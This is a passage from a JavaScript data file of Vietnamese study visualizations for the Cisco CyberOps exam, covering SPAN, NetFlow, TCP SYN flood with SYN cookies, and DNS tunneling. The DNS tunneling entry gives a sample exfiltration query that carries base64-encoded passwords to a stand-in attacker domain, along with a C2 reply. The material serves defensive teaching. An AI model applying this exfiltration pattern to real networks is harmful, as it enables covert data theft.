// Cisco CyberOps Associate (200-201 CBROPS) - Modern Interactive Mechanism Visualizations
// Ngôn ngữ kỹ thuật chuẩn xác, basic-meaning, không ẩn dụ, không nói quá.
(function() {
  'use strict';

  window.MECHANISM_VISUALIZATIONS = {
  "span_mirror": {
    "title": "Cơ chế nhân bản cổng giám sát lưu lượng Cisco SPAN (Switched Port Analyzer)",
    "badge": "Security Monitoring & Telemetry / Port Mirroring",
    "summary": "Switch chuyển tiếp khung tin ở Layer 2 dựa vào bảng MAC, khiến thiết bị giám sát mạng (NIDS / Wireshark) ở cổng khác không thấy được lưu lượng. Cơ chế SPAN sao chép khung dữ liệu từ cổng nguồn (Source Port) gửi tới cổng giám sát (Destination Port).",
    "topology": {
      "nodes": [
        {
          "id": "pc_a",
          "type": "pc",
          "label": "Host A (Nguồn)",
          "sub": "Port Fa0/1",
          "x": 80,
          "y": 80
        },
        {
          "id": "sw1",
          "type": "switch",
          "label": "Cisco Switch",
          "sub": "SPAN Session 1",
          "x": 250,
          "y": 80
        },
        {
          "id": "server",
          "type": "server",
          "label": "Server (Đích)",
          "sub": "Port Fa0/2",
          "x": 420,
          "y": 80
        },
        {
          "id": "ids",
          "type": "pc",
          "label": "Wireshark / NIDS",
          "sub": "Port Fa0/24 (SPAN Dest)",
          "x": 250,
          "y": 200
        }
      ],
      "links": [
        {
          "from": "pc_a",
          "to": "sw1",
          "label": "Fa0/1 (Rx/Tx)"
        },
        {
          "from": "sw1",
          "to": "server",
          "label": "Fa0/2 Forwarding"
        },
        {
          "from": "sw1",
          "to": "ids",
          "label": "Fa0/24 Mirror Copy"
        }
      ]
    },
    "steps": [
      {
        "num": 1,
        "name": "Host A truyền khung tin đến Server qua cổng Fa0/1",
        "desc": "Host A gửi luồng dữ liệu bình thường tới Server qua cổng Fa0/1 của switch. Cổng Fa0/1 được cấu hình là SPAN Source Port.",
        "fromNode": "pc_a",
        "toNode": "sw1",
        "packetLabel": "Original Frame",
        "status": "forward",
        "actionText": "Khung tin đi vào cổng nguồn SPAN Fa0/1",
        "pdu": {
          "layer2": "Src MAC: 00:11:22:AA:BB:CC | Dst MAC: 00:44:55:DD:EE:FF | Type: IPv4 (0x0800)",
          "layer3": "Src IP: 192.168.1.10 | Dst IP: 192.168.1.50 | Protocol: TCP (6)",
          "layer4": "Src Port: 49152 | Dst Port: 80 (HTTP) | Flags: PSH, ACK",
          "payload": "HTTP GET /index.html HTTP/1.1 (Dữ liệu ứng dụng người dùng)"
        },
        "deviceState": {
          "title": "Bảng cấu hình SPAN Session trên Switch",
          "headers": [
            "Session",
            "Source Ports",
            "Direction",
            "Destination Port",
            "Trạng thái"
          ],
          "rows": [
            [
              "Session 1",
              "FastEthernet0/1",
              "Both (Rx/Tx)",
              "FastEthernet0/24",
              "Active"
            ]
          ]
        }
      },
      {
        "num": 2,
        "name": "Switch chuyển tiếp luồng dữ liệu chính đến Server",
        "desc": "Switch tra bảng MAC và chuyển tiếp khung dữ liệu nguyên bản ra cổng Fa0/2 tới Server mà không gây trễ hay biến đổi nội dung.",
        "fromNode": "sw1",
        "toNode": "server",
        "packetLabel": "Normal Forwarding",
        "status": "forward",
        "actionText": "Chuyển tiếp khung dữ liệu nguyên bản ra cổng Fa0/2",
        "pdu": {
          "layer2": "Chuyển mạch phần cứng ASIC tốc độ dây (Line rate)",
          "layer3": "Không thay đổi tiêu đề IP (Src: 192.168.1.10, Dst: 192.168.1.50)",
          "layer4": "Phiên TCP được duy trì nguyên vẹn",
          "payload": "Dữ liệu đến Server đúng theo chu trình truyền thông bình thường."
        },
        "deviceState": {
          "title": "Bảng CAM Table (MAC Address Table) của Switch",
          "headers": [
            "VLAN",
            "Địa chỉ MAC",
            "Loại",
            "Cổng giao diện"
          ],
          "rows": [
            [
              "VLAN 1",
              "00:11:22:AA:BB:CC",
              "DYNAMIC",
              "FastEthernet0/1"
            ],
            [
              "VLAN 1",
              "00:44:55:DD:EE:FF",
              "DYNAMIC",
              "FastEthernet0/2"
            ]
          ]
        }
      },
      {
        "num": 3,
        "name": "ASIC của Switch nhân bản khung dữ liệu (Mirroring)",
        "desc": "Tiến trình SPAN tạo một bản sao độc lập của khung tin tại phần cứng ASIC mà không làm suy giảm hiệu năng chuyển mạch cổng chính.",
        "fromNode": "sw1",
        "toNode": "sw1",
        "packetLabel": "SPAN Replicate",
        "status": "forward",
        "actionText": "Phần cứng ASIC tạo bản sao khung tin của cổng Fa0/1",
        "pdu": {
          "layer2": "Nhân bản nguyên vẹn tiêu đề Ethernet và trường kiểm tra lỗi CRC/FCS",
          "layer3": "Bản sao giữ nguyên cấu trúc gói IP",
          "layer4": "Không làm thay đổi số thứ tự Sequence Number",
          "payload": "Bản sao hoàn chỉnh 100% nội dung gói tin gốc."
        },
        "deviceState": {
          "title": "Bộ đếm lưu lượng SPAN (SPAN Packet Counters)",
          "headers": [
            "Giao diện",
            "Số gói tin gốc (Packets)",
            "Số gói đã sao chép",
            "Lỗi tràn hàng đợi"
          ],
          "rows": [
            [
              "Fa0/1 (Nguồn)",
              "14,820",
              "14,820",
              "0 dropped"
            ],
            [
              "Fa0/24 (Đích)",
              "-",
              "14,820",
              "0 dropped"
            ]
          ]
        }
      },
      {
        "num": 4,
        "name": "Chuyển bản sao ra cổng SPAN Destination Fa0/24 tới IDS",
        "desc": "Switch chuyển bản sao ra cổng Fa0/24 nối với bộ cảm biến NIDS / Wireshark. Cổng đích SPAN chỉ dùng để xuất lưu lượng giám sát, bị vô hiệu hóa gửi dữ liệu người dùng.",
        "fromNode": "sw1",
        "toNode": "ids",
        "packetLabel": "Mirrored Copy",
        "status": "forward",
        "actionText": "Gửi bản sao khung tin tới thiết bị giám sát Wireshark / NIDS",
        "pdu": {
          "layer2": "Xuất khung qua cổng Fa0/24 (Không tham gia giao thức STP)",
          "layer3": "Cảm biến NIDS nhận gói tin để phân tích chữ ký mã độc",
          "layer4": "Wireshark giải mã tiêu đề TCP/HTTP",
          "payload": "Hệ thống giám sát phân tích hành vi mà không can thiệp vào luồng mạng chính."
        },
        "deviceState": {
          "title": "Đặc tính cổng SPAN Destination (Port Fa0/24)",
          "headers": [
            "Thông số",
            "Giá trị",
            "Mục đích kỹ thuật"
          ],
          "rows": [
            [
              "Chế độ cổng",
              "Monitoring Only",
              "Chỉ nhận luồng sao chép, không phát lưu lượng người dùng"
            ],
            [
              "Giao thức Layer 2",
              "STP / CDP / DTP Disabled",
              "Tránh gửi gói tin quản trị ngược vào thiết bị phân tích"
            ],
            [
              "Inbound Traffic",
              "Bị chặn mặc định",
              "Bảo vệ an toàn cho hệ thống mạng"
            ]
          ]
        }
      }
    ],
    "specTable": {
      "headers": [
        "Khái niệm trong Cisco SPAN",
        "Đặc tính kỹ thuật",
        "Phạm vi áp dụng"
      ],
      "rows": [
        [
          "Source Port (Monitored Port)",
          "Cổng switch có lưu lượng cần giám sát (Inbound, Outbound hoặc cả hai)",
          "Cục bộ trên cùng một switch"
        ],
        [
          "Destination Port (Monitoring Port)",
          "Cổng nối tới NIDS / Wireshark, không tham gia chuyển mạch thường",
          "Chỉ nhận bản sao dữ liệu"
        ],
        [
          "RSPAN (Remote SPAN)",
          "Truyền bản sao qua một VLAN riêng biệt (RSPAN VLAN) giữa nhiều switch",
          "Hạ tầng Layer 2 mở rộng"
        ],
        [
          "ERSPAN (Encapsulated RSPAN)",
          "Đóng gói bản sao vào tiêu đề GRE (IP Protocol 47) để định tuyến qua Layer 3",
          "Mạng diện rộng Routed Network"
        ]
      ]
    },
    "takeaway": "Cổng đích SPAN (Destination Port) bị vô hiệu hóa các giao thức Layer 2 (STP, CDP) và chỉ có nhiệm vụ chuyển tiếp bản sao lưu lượng đến thiết bị giám sát."
  },
  "netflow_meta": {
    "title": "Kiến trúc thu thập và phân tích lưu lượng NetFlow / IPFIX",
    "badge": "Telemetry & Anomaly Detection / Flow Monitoring",
    "summary": "NetFlow không thu thập toàn bộ nội dung gói tin (payload) mà chỉ trích xuất siêu dữ liệu (metadata) của các luồng thông tin dựa trên 7 thuộc tính nhận dạng, giúp giám sát lưu lượng mạng quy mô lớn với chi phí tài nguyên thấp.",
    "topology": {
      "nodes": [
        {
          "id": "client",
          "type": "pc",
          "label": "Host mạng LAN",
          "sub": "192.168.1.10",
          "x": 70,
          "y": 80
        },
        {
          "id": "router",
          "type": "router",
          "label": "Cisco Router (NetFlow Exporter)",
          "sub": "Flow Cache Active",
          "x": 260,
          "y": 80
        },
        {
          "id": "web",
          "type": "server",
          "label": "External Web",
          "sub": "203.0.113.50",
          "x": 450,
          "y": 80
        },
        {
          "id": "collector",
          "type": "server",
          "label": "NetFlow Collector",
          "sub": "10.0.0.99:2055",
          "x": 260,
          "y": 200
        }
      ],
      "links": [
        {
          "from": "client",
          "to": "router",
          "label": "Gói tin Ingress"
        },
        {
          "from": "router",
          "to": "web",
          "label": "Chuyển tiếp Egress"
        },
        {
          "from": "router",
          "to": "collector",
          "label": "UDP Datagram (Port 2055)"
        }
      ]
    },
    "steps": [
      {
        "num": 1,
        "name": "Router tiếp nhận gói tin và trích xuất 7 trường khóa nhận dạng Flow",
        "desc": "Khi gói tin IP đi vào cổng Ingress, Router trích xuất 7 thuộc tính cốt lõi để xác định xem gói tin thuộc luồng (flow) đã có hay mở ra luồng mới.",
        "fromNode": "client",
        "toNode": "router",
        "packetLabel": "IP Packet Ingress",
        "status": "forward",
        "actionText": "Trích xuất 7 trường khóa nhận dạng luồng NetFlow",
        "pdu": {
          "layer2": "Ethernet II | Cổng vào Ingress: GigabitEthernet0/0",
          "layer3": "Src IP: 192.168.1.10 | Dst IP: 203.0.113.50 | Protocol: TCP (6) | ToS/DSCP: 0",
          "layer4": "Src Port: 51234 | Dst Port: 443 (HTTPS)",
          "payload": "Kích thước gói tin: 1200 bytes"
        },
        "deviceState": {
          "title": "7 Trường khóa định danh luồng NetFlow (7 Key Flow Fields)",
          "headers": [
            "STT",
            "Trường thông tin (Field)",
            "Giá trị trích xuất từ gói tin"
          ],
          "rows": [
            [
              "1 & 2",
              "Source IP & Destination IP",
              "192.168.1.10 -> 203.0.113.50"
            ],
            [
              "3 & 4",
              "Source Port & Destination Port",
              "51234 -> 443"
            ],
            [
              "5",
              "Layer 3 Protocol",
              "TCP (Protocol 6)"
            ],
            [
              "6",
              "Ingress Interface",
              "GigabitEthernet0/0"
            ],
            [
              "7",
              "IP Type of Service (ToS)",
              "0x00 (Best Effort)"
            ]
          ]
        }
      },
      {
        "num": 2,
        "name": "Router cập nhật bảng bộ nhớ đệm NetFlow Cache",
        "desc": "Nếu 7 trường khóa khớp với một bản ghi đang tồn tại trong NetFlow Cache, Router tăng số đếm gói tin và byte. Nếu chưa có, Router tạo bản ghi luồng mới.",
        "fromNode": "router",
        "toNode": "router",
        "packetLabel": "Flow Cache Update",
        "status": "forward",
        "actionText": "Cập nhật bảng bộ nhớ đệm NetFlow Cache trong RAM",
        "pdu": {
          "layer2": "Tra cứu bảng băm Flow Cache trong bộ nhớ RAM Router",
          "layer3": "Bản ghi luồng: Khởi tạo thời điểm bắt đầu (Start Time)",
          "layer4": "Theo dõi cờ TCP (Cumulative TCP Flags)",
          "payload": "Cộng dồn số lượng gói tin và tổng dung lượng bytes."
        },
        "deviceState": {
          "title": "Bảng bộ nhớ đệm luồng NetFlow (NetFlow Cache Table)",
          "headers": [
            "Src IP:Port",
            "Dst IP:Port",
            "Proto",
            "Gói (Pkts)",
            "Dung lượng (Bytes)",
            "Thời gian tồn tại"
          ],
          "rows": [
            [
              "192.168.1.10:51234",
              "203.0.113.50:443",
              "TCP",
              "48",
              "62,400 bytes",
              "12s (Đang hoạt động)"
            ],
            [
              "192.168.1.15:49200",
              "8.8.8.8:53",
              "UDP",
              "2",
              "148 bytes",
              "1s"
            ]
          ]
        }
      },
      {
        "num": 3,
        "name": "Router chuyển tiếp gói tin ra ngoài Internet",
        "desc": "Tiến trình NetFlow hoạt động độc lập và song song với tiến trình chuyển tiếp phần cứng CEF nên không làm gián đoạn việc truyền dữ liệu của người dùng.",
        "fromNode": "router",
        "toNode": "web",
        "packetLabel": "Normal Forwarding",
        "status": "forward",
        "actionText": "Chuyển tiếp gói tin ra cổng WAN tới máy chủ đích",
        "pdu": {
          "layer2": "CEF chuyển mạch tốc độ cao",
          "layer3": "TTL giảm 1 đơn vị, gửi qua giao diện GigabitEthernet0/1",
          "layer4": "TCP stream được truyền nguyên vẹn",
          "payload": "Dữ liệu người dùng truyền tới máy chủ web bên ngoài."
        },
        "deviceState": {
          "title": "Bộ đếm tài nguyên hệ thống Router",
          "headers": [
            "Thành phần",
            "Trạng thái",
            "Mức tiêu thụ"
          ],
          "rows": [
            [
              "CEF Switching Engine",
              "Bình thường",
              "Tốc độ phần cứng ASIC"
            ],
            [
              "NetFlow Cache RAM",
              "256 KB / 16 MB",
              "Tối ưu, dưới 2% RAM hệ thống"
            ]
          ]
        }
      },
      {
        "num": 4,
        "name": "Xuất bản ghi luồng (NetFlow Export) tới NetFlow Collector",
        "desc": "Khi luồng kết thúc (nhận cờ TCP FIN/RST) hoặc hết hạn bộ định thời (Inactive Timer 15s / Active Timer 30m), Router đóng gói bản ghi NetFlow vào UDP gửi tới máy chủ Collector.",
        "fromNode": "router",
        "toNode": "collector",
        "packetLabel": "NetFlow Export (UDP 2055)",
        "status": "forward",
        "actionText": "Gửi bản ghi thống kê luồng tới NetFlow Collector (Port 2055)",
        "pdu": {
          "layer2": "Đóng gói Ethernet gửi tới MAC của NetFlow Collector",
          "layer3": "Src IP: 10.0.0.1 (Router) | Dst IP: 10.0.0.99 (Collector)",
          "layer4": "UDP Src Port: 54321 | Dst Port: 2055 (NetFlow v9/IPFIX)",
          "payload": "Flow Record: Src 192.168.1.10:51234 -> Dst 203.0.113.50:443 | 48 packets | 62.4 KB | Duration 12s"
        },
        "deviceState": {
          "title": "Điều kiện xuất bản ghi luồng NetFlow (Export Triggers)",
          "headers": [
            "Điều kiện kích hoạt",
            "Giá trị mặc định",
            "Mô tả"
          ],
          "rows": [
            [
              "Inactive Timeout",
              "15 giây",
              "Không có gói tin mới thuộc luồng trong 15s"
            ],
            [
              "Active Timeout",
              "30 phút",
              "Luồng kéo dài liên tục quá 30 phút sẽ xuất bản ghi phân đoạn"
            ],
            [
              "Kết thúc phiên TCP",
              "Nhận cờ FIN hoặc RST",
              "Xuất ngay lập tức khi phiên kết thúc"
            ]
          ]
        }
      }
    ],
    "specTable": {
      "headers": [
        "Phiên bản NetFlow / Chuẩn",
        "Đặc tính cấu trúc",
        "Khả năng mở rộng"
      ],
      "rows": [
        [
          "NetFlow v5",
          "Cấu trúc bản ghi cố định (chỉ hỗ trợ IPv4)",
          "Phổ biến trên hệ thống cũ, không hỗ trợ IPv6/VLAN"
        ],
        [
          "NetFlow v9",
          "Cấu trúc dựa trên Template động",
          "Hỗ trợ IPv6, MPLS, Multicast, thông tin bảo mật mở rộng"
        ],
        [
          "IPFIX (RFC 7011)",
          "Chuẩn mở IETF kế thừa từ NetFlow v9",
          "Hỗ trợ trường thông tin tùy biến doanh nghiệp (Enterprise ID)"
        ]
      ]
    },
    "takeaway": "NetFlow thu thập siêu dữ liệu thống kê một chiều (Unidirectional metadata) dựa trên 7 trường khóa, không lưu nội dung chi tiết (payload) của gói tin."
  },
  "tcp_handshake_syn_flood": {
    "title": "Bắt tay 3 bước TCP (3-Way Handshake) và cơ chế tấn công SYN Flood",
    "badge": "Transport Layer Security / TCP State Machine & DoS",
    "summary": "Giao thức TCP thiết lập kết nối tin cậy qua 3 bước bắt tay (SYN -> SYN-ACK -> ACK). Kẻ tấn công lợi dụng cơ chế này bằng cách gửi hàng loạt gói tin SYN giả mạo nhưng không bao giờ phản hồi ACK, làm cạn kiệt hàng đợi kết nối (Backlog Queue) của máy chủ.",
    "topology": {
      "nodes": [
        {
          "id": "client",
          "type": "pc",
          "label": "Client hợp lệ",
          "sub": "192.168.1.10",
          "x": 80,
          "y": 70
        },
        {
          "id": "attacker",
          "type": "attacker",
          "label": "Attacker (Botnet)",
          "sub": "IP giả mạo",
          "x": 80,
          "y": 180
        },
        {
          "id": "server",
          "type": "server",
          "label": "Web Server (Đích)",
          "sub": "TCP Port 80 / Backlog Queue",
          "x": 420,
          "y": 120
        }
      ],
      "links": [
        {
          "from": "client",
          "to": "server",
          "label": "Bắt tay TCP chuẩn"
        },
        {
          "from": "attacker",
          "to": "server",
          "label": "SYN Flood (Spoofed IPs)"
        }
      ]
    },
    "steps": [
      {
        "num": 1,
        "name": "Client hợp lệ gửi gói tin SYN (Bước 1)",
        "desc": "Client khởi tạo kết nối TCP bằng cách gửi gói tin có cờ SYN được bật, cùng với số thứ tự khởi tạo ban đầu ISN (Initial Sequence Number). Trạng thái Client: SYN_SENT.",
        "fromNode": "client",
        "toNode": "server",
        "packetLabel": "SYN (Seq=1000)",
        "status": "forward",
        "actionText": "Client gửi cờ SYN, Seq=1000 tới Server",
        "pdu": {
          "layer2": "Src MAC: Client | Dst MAC: Server",
          "layer3": "Src IP: 192.168.1.10 | Dst IP: 203.0.113.10",
          "layer4": "TCP Src Port: 52100 | Dst Port: 80 | Flags: SYN | Seq: 1000 | Ack: 0",
          "payload": "TCP Options: MSS 1460, Window Scale 7, SACK Permitted"
        },
        "deviceState": {
          "title": "Bảng trạng thái kết nối TCP (TCP State Machine)",
          "headers": [
            "Thiết bị",
            "Trạng thái TCP",
            "Hàng đợi Backlog Queue",
            "Bộ nhớ cấp phát"
          ],
          "rows": [
            [
              "Client",
              "SYN_SENT",
              "Chờ phản hồi SYN-ACK",
              "Tạo Socket TCB"
            ],
            [
              "Server",
              "LISTEN",
              "Sẵn sàng nhận kết nối mới",
              "Đang chờ"
            ]
          ]
        }
      },
      {
        "num": 2,
        "name": "Server phản hồi SYN-ACK và cấp phát hàng đợi bán mở (Bước 2)",
        "desc": "Server ghi nhận yêu cầu, cấp phát một khối điều khiển TCB trong hàng đợi bán mở (SYN Backlog Queue), và gửi gói tin SYN-ACK về cho Client. Trạng thái Server: SYN_RCVD.",
        "fromNode": "server",
        "toNode": "client",
        "packetLabel": "SYN-ACK (Seq=5000, Ack=1001)",
        "status": "forward",
        "actionText": "Server gửi SYN-ACK, Seq=5000, Ack=1001 về Client",
        "pdu": {
          "layer2": "Src MAC: Server | Dst MAC: Client",
          "layer3": "Src IP: 203.0.113.10 | Dst IP: 192.168.1.10",
          "layer4": "TCP Src Port: 80 | Dst Port: 52100 | Flags: SYN, ACK | Seq: 5000 | Ack: 1001",
          "payload": "Xác nhận đã nhận SYN số 1000 (+1 thành 1001) và phát số thứ tự của Server 5000."
        },
        "deviceState": {
          "title": "Hàng đợi kết nối bán mở (SYN Backlog Queue) trên Server",
          "headers": [
            "Địa chỉ IP Client",
            "Cổng kết nối",
            "Trạng thái",
            "Thời gian chờ (Timeout)"
          ],
          "rows": [
            [
              "192.168.1.10",
              "Port 52100",
              "SYN_RCVD (Half-Open)",
              "Chờ gói ACK cuối cùng (75s)"
            ]
          ]
        }
      },
      {
        "num": 3,
        "name": "Client gửi gói tin ACK hoàn tất bắt tay (Bước 3)",
        "desc": "Client gửi gói tin có cờ ACK xác nhận số thứ tự của Server. Kết nối chuyển sang trạng thái ESTABLISHED, sẵn sàng truyền dữ liệu người dùng.",
        "fromNode": "client",
        "toNode": "server",
        "packetLabel": "ACK (Seq=1001, Ack=5001)",
        "status": "forward",
        "actionText": "Client gửi ACK hoàn tất bắt tay 3 bước",
        "pdu": {
          "layer2": "Src MAC: Client | Dst MAC: Server",
          "layer3": "Src IP: 192.168.1.10 | Dst IP: 203.0.113.10",
          "layer4": "TCP Src Port: 52100 | Dst Port: 80 | Flags: ACK | Seq: 1001 | Ack: 5001",
          "payload": "Bắt tay 3 bước hoàn tất thành công. Bắt đầu gửi dữ liệu ứng dụng."
        },
        "deviceState": {
          "title": "Trạng thái kết nối đã hoàn tất (Established Connections)",
          "headers": [
            "Client IP:Port",
            "Server IP:Port",
            "Trạng thái",
            "Hàng đợi"
          ],
          "rows": [
            [
              "192.168.1.10:52100",
              "203.0.113.10:80",
              "ESTABLISHED",
              "Chuyển từ SYN Backlog sang Accept Queue"
            ]
          ]
        }
      },
      {
        "num": 4,
        "name": "Kẻ tấn công gửi bão gói tin SYN giả mạo (SYN Flood Attack)",
        "desc": "Kẻ tấn công sử dụng công cụ gửi liên tục hàng nghìn gói tin SYN với địa chỉ IP nguồn giả mạo không tồn tại. Kẻ tấn công cố tình không bao giờ gửi gói ACK phản hồi.",
        "fromNode": "attacker",
        "toNode": "server",
        "packetLabel": "SYN Flood (Spoofed)",
        "status": "drop",
        "actionText": "SYN Flood: Hàng nghìn kết nối nửa mở làm tràn Backlog Queue",
        "pdu": {
          "layer2": "Khung tin từ botnet nguồn giả mạo",
          "layer3": "Src IP: Giả mạo ngẫu nhiên (10.x.x.x, 172.x.x.x) | Dst IP: 203.0.113.10",
          "layer4": "Flags: SYN duy nhất | Port nguồn ngẫu nhiên",
          "payload": "Kẻ tấn công không trả lời SYN-ACK khiến Server giữ tài nguyên bộ nhớ cho đến khi hết hạn."
        },
        "deviceState": {
          "title": "Tình trạng hàng đợi Backlog Queue khi bị tấn công SYN Flood",
          "headers": [
            "Địa chỉ IP nguồn",
            "Trạng thái",
            "Dung lượng hàng đợi",
            "Hậu quả"
          ],
          "rows": [
            [
              "Spoofed IP #1",
              "SYN_RCVD (Chờ ACK)",
              "Hàng đợi đầy: 1024/1024",
              "Từ chối mọi kết nối mới"
            ],
            [
              "Spoofed IP #2",
              "SYN_RCVD (Chờ ACK)",
              "Sử dụng 100% RAM TCB",
              "Người dùng hợp lệ bị chặn"
            ],
            [
              "Client hợp lệ",
              "Không thể kết nối",
              "Bị rơi gói tin (Drop)",
              "Mất khả năng phục vụ (DoS)"
            ]
          ]
        }
      },
      {
        "num": 5,
        "name": "Cơ chế phòng vệ: Bật SYN Cookies trên Server / Firewall",
        "desc": "Khi bật SYN Cookies, Server không cấp phát bộ nhớ TCB trong Backlog Queue khi nhận SYN. Thay vào đó, Server tính toán một giá trị băm mã hóa đưa vào số ISN của gói SYN-ACK. Bộ nhớ chỉ được cấp phát khi nhận được gói ACK hợp lệ mang giá trị giải mã đúng.",
        "fromNode": "server",
        "toNode": "server",
        "packetLabel": "SYN Cookies Active",
        "status": "forward",
        "actionText": "Kích hoạt SYN Cookies: Triệt tiêu tình trạng cạn kiệt bộ nhớ",
        "pdu": {
          "layer2": "Kiểm tra mức độ đầy của hàng đợi Backlog",
          "layer3": "Phát hiện ngưỡng vượt quá (SYN Flood Threshold)",
          "layer4": "ISN = Hash(Src IP, Dst IP, Src Port, Dst Port, Secret Key)",
          "payload": "Máy chủ không phân bổ bộ nhớ cho trạng thái kết nối bán mở."
        },
        "deviceState": {
          "title": "Bảng so sánh cơ chế phòng vệ SYN Flood",
          "headers": [
            "Giải pháp",
            "Nguyên lý hoạt động",
            "Ưu điểm kỹ thuật"
          ],
          "rows": [
            [
              "SYN Cookies",
              "Mã hóa trạng thái kết nối vào số ISN",
              "Không tiêu tốn bộ nhớ RAM khi chưa nhận được ACK cuối"
            ],
            [
              "TCP Intercept (Firewall)",
              "Firewall thay mặt máy chủ thực hiện bắt tay 3 bước",
              "Chỉ chuyển kết nối đã hoàn thành vào máy chủ nội bộ"
            ],
            [
              "Giảm SYN-Received Timer",
              "Giảm thời gian chờ từ 75s xuống 10s",
              "Thu hồi tài nguyên nhanh hơn"
            ]
          ]
        }
      }
    ],
    "specTable": {
      "headers": [
        "Thuộc tính TCP",
        "Giá trị / Trạng thái",
        "Ý nghĩa an ninh mạng"
      ],
      "rows": [
        [
          "SYN Flag (Synchronize)",
          "Bit thứ 8 trong trường cờ TCP",
          "Khởi tạo kết nối, đồng bộ số Sequence"
        ],
        [
          "ACK Flag (Acknowledgment)",
          "Bit thứ 5 trong trường cờ TCP",
          "Xác nhận đã nhận gói tin trước đó"
        ],
        [
          "Backlog Queue",
          "Giới hạn kết nối bán mở trong hệ điều hành",
          "Mục tiêu bị khai thác trong tấn công SYN Flood"
        ],
        [
          "SYN Cookies",
          "Tính năng bảo vệ TCP Stack nhân Linux/Windows",
          "Phòng chống DoS mà không cần mở rộng phần cứng"
        ]
      ]
    },
    "takeaway": "Tấn công SYN Flood làm cạn kiệt hàng đợi bán mở (Backlog Queue) bằng các gói SYN giả mạo; cơ chế SYN Cookies phòng vệ bằng cách mã hóa trạng thái phiên vào số Sequence mà không cấp phát RAM trước."
  },
  "dns_tunneling": {
    "title": "Khai thác và phát hiện kỹ thuật tạo đường hầm DNS (DNS Tunneling)",
    "badge": "Threat Analysis & Detection / Covert Channels",
    "summary": "DNS là giao thức thiết yếu và hầu như luôn được phép đi qua tường lửa (UDP Port 53). Kẻ tấn công lợi dụng điểm này để mã hóa dữ liệu đánh cắp hoặc lệnh điều khiển C2 vào các trường truy vấn DNS nhằm vượt qua hệ thống giám sát an ninh.",
    "topology": {
      "nodes": [
        {
          "id": "infected",
          "type": "pc",
          "label": "Máy nạn nhân bị nhiễm",
          "sub": "192.168.1.100 (Trojan/Exfil)",
          "x": 70,
          "y": 80
        },
        {
          "id": "local_dns",
          "type": "server",
          "label": "DNS Resolver nội bộ",
          "sub": "192.168.1.2 (Recursive)",
          "x": 240,
          "y": 80
        },
        {
          "id": "c2_dns",
          "type": "attacker",
          "label": "Nameserver Attacker (C2)",
          "sub": "ns1.bad-actor.com (Port 53)",
          "x": 430,
          "y": 80
        },
        {
          "id": "soc_siem",
          "type": "pc",
          "label": "Hệ thống SOC / SIEM",
          "sub": "DNS Telemetry & AI",
          "x": 240,
          "y": 200
        }
      ],
      "links": [
        {
          "from": "infected",
          "to": "local_dns",
          "label": "UDP 53 Query mã hóa"
        },
        {
          "from": "local_dns",
          "to": "c2_dns",
          "label": "Truy vấn đệ quy Internet"
        },
        {
          "from": "local_dns",
          "to": "soc_siem",
          "label": "DNS Logs / Zeek Bro"
        }
      ]
    },
    "steps": [
      {
        "num": 1,
        "name": "Mã độc mã hóa dữ liệu nhạy cảm vào tên miền con (Subdomain)",
        "desc": "Mã độc trên máy nạn nhân trích xuất mật khẩu hoặc số thẻ tín dụng, mã hóa dạng Base32/Base64 và ghép vào tiền tố truy vấn DNS: [encoded-data].bad-actor.com.",
        "fromNode": "infected",
        "toNode": "local_dns",
        "packetLabel": "DNS Query (Encoded Data)",
        "status": "forward",
        "actionText": "Gửi truy vấn DNS chứa dữ liệu mã hóa ra máy chủ DNS nội bộ",
        "pdu": {
          "layer2": "Ethernet II gửi tới Gateway nội bộ",
          "layer3": "Src IP: 192.168.1.100 | Dst IP: 192.168.1.2",
          "layer4": "UDP Src Port: 53120 | Dst Port: 53 (DNS)",
          "payload": "Query: aXNlY3JldDEyMzQ1.exfil.bad-actor.com | Type: TXT / A | Class: IN"
        },
        "deviceState": {
          "title": "Nhật ký truy vấn DNS tại máy nạn nhân",
          "headers": [
            "Thời gian",
            "Tiền tố dữ liệu mã hóa",
            "Tên miền gốc",
            "Loại truy vấn"
          ],
          "rows": [
            [
              "10:14:02",
              "aXNlY3JldDEyMzQ1",
              "bad-actor.com",
              "TXT (Chứa Payload)"
            ],
            [
              "10:14:03",
              "cGFzc3dvcmQ5OTk=",
              "bad-actor.com",
              "TXT (Chứa Payload)"
            ]
          ]
        }
      },
      {
        "num": 2,
        "name": "DNS Resolver nội bộ chuyển tiếp truy vấn đệ quy ra Internet",
        "desc": "Vì máy chủ DNS nội bộ không có bản ghi cục bộ cho bad-actor.com, hệ thống thực hiện phân giải đệ quy qua Root Nameserver và chuyển yêu cầu tới Nameserver quản lý của kẻ tấn công.",
        "fromNode": "local_dns",
        "toNode": "c2_dns",
        "packetLabel": "Recursive Query to C2",
        "status": "forward",
        "actionText": "DNS Server nội bộ chuyển tiếp đệ quy tới máy chủ DNS của Attacker",
        "pdu": {
          "layer2": "Khung tin định tuyến qua WAN Interface",
          "layer3": "Src IP: IP Public công ty | Dst IP: IP Nameserver của Attacker",
          "layer4": "UDP Dst Port: 53 (Cho phép hợp lệ qua Firewall)",
          "payload": "Truy vấn DNS được chuyển tiếp mà không bị tường lửa chặn vì cổng 53 được mở cho DNS."
        },
        "deviceState": {
          "title": "Bảng bộ nhớ đệm phân giải DNS (DNS Recursive Cache)",
          "headers": [
            "Tên miền truy vấn",
            "Next-Hop Nameserver",
            "Trạng thái phân giải"
          ],
          "rows": [
            [
              "exfil.bad-actor.com",
              "ns1.bad-actor.com (203.0.113.88)",
              "Chờ phản hồi (Pending)"
            ]
          ]
        }
      },
      {
        "num": 3,
        "name": "Kẻ tấn công trích xuất dữ liệu và gửi lệnh C2 trong phản hồi DNS",
        "desc": "Máy chủ DNS của kẻ tấn công thu thập các chuỗi tiền tố, giải mã thu thập dữ liệu bí mật và đóng gói lệnh điều khiển mới vào bản ghi phản hồi DNS TXT / NULL.",
        "fromNode": "c2_dns",
        "toNode": "local_dns",
        "packetLabel": "DNS TXT Reply (C2 Commands)",
        "status": "forward",
        "actionText": "Attacker thu thập dữ liệu và trả lời lệnh C2 trong trường TXT",
        "pdu": {
          "layer2": "Khung tin phản hồi từ Internet về máy chủ công ty",
          "layer3": "Src IP: 203.0.113.88 | Dst IP: IP Public công ty",
          "layer4": "UDP Src Port: 53 | Dst Port: Cổng phân giải nội bộ",
          "payload": "DNS Response: TXT = 'EXECUTE_PAYLOAD_STAGE2_DOWNLOAD_KEY'"
        },
        "deviceState": {
          "title": "Bảng dữ liệu giải mã tại máy chủ Attacker",
          "headers": [
            "Dữ liệu nhận được",
            "Giải mã Base64",
            "Mục đích"
          ],
          "rows": [
            [
              "aXNlY3JldDEyMzQ1",
              "isecret12345",
              "Dữ liệu mật khẩu tài khoản"
            ],
            [
